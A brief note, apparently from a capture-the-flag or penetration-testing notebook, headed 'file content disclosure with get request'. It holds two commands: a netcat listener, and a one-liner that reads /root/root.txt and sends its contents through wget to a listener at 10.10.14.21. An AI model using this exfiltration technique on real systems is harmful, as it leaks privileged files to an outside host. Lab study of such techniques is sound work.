---
publish: true
created: 2026-10-03T08:40:24.748Z
modified: 2026-10-03T08:40:24.748Z
---

### file content disclosure with get request

```
nc -lnvp 1234
cat /root/root.txt | xargs -I {} wget http://10.10.14.21:1234/{}
```
